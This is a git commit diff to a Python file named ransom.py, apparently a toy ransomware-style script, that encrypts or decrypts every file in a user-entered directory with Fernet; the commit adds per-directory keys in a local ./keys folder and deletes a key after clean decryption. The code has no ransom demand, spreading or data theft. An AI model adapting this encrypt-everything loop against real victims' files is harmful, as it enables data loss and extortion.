49a0c1b67e4513d14a68597417d59551161348d2
Abel Simões <abelrmsimoes@gmail.com>
2023-06-12 09:17:17 -0300

    Adicionando compatibilidade com diversas chaves

--- ransom.py
+++ ransom.py
@@ -1,15 +1,18 @@
 import os
+import uuid
 from cryptography.fernet import Fernet
 
 
-def generate_key():
+def generate_key(md5_hash):
     key = Fernet.generate_key()
-    with open("key.key", "wb") as key_file:
+    if not os.path.exists("./keys"):
+        os.mkdir("./keys")
+    with open(f"./keys/{md5_hash}.key", "wb") as key_file:
         key_file.write(key)
 
 
-def load_key():
-    return open("key.key", "rb").read()
+def load_key(md5_hash):
+    return open(f"./keys/{md5_hash}.key", "rb").read()
 
 
 def encrypt_file(file_path, key):
@@ -39,10 +42,11 @@ def main():
         "Você deseja criptografar (1) ou descriptografar (2) um diretório? ")
 
     if choice == "1":
-        generate_key()
-        key = load_key()
         directory = input(
             "Digite o caminho completo do diretório que deseja criptografar: ")
+        md5_hash = uuid.uuid5(uuid.NAMESPACE_DNS, directory).hex
+        generate_key(md5_hash)
+        key = load_key(md5_hash)
         for root, dirs, files in os.walk(directory):
             for file in files:
                 try:
@@ -53,9 +57,12 @@ def main():
         print("Arquivos criptografados com sucesso!")
 
     elif choice == "2":
-        key = load_key()
         directory = input(
             "Digite o caminho completo do diretório que deseja descriptografar: ")
+        md5_hash = uuid.uuid5(uuid.NAMESPACE_DNS, directory).hex
+        key = load_key(md5_hash)
+        everything_ok = True
+
         for root, dirs, files in os.walk(directory):
             for file in files:
                 try:
@@ -63,7 +70,11 @@ def main():
                     print(f"{file} descriptografado com sucesso!")
                 except:
                     print(f"{file} não pode ser descriptografado!")
+                    everything_ok = False
         print("Arquivos descriptografados com sucesso!")
+
+        if everything_ok:
+            os.remove(f"./keys/{md5_hash}.key")
 
     else:
         print("Opção inválida. Tente novamente.")
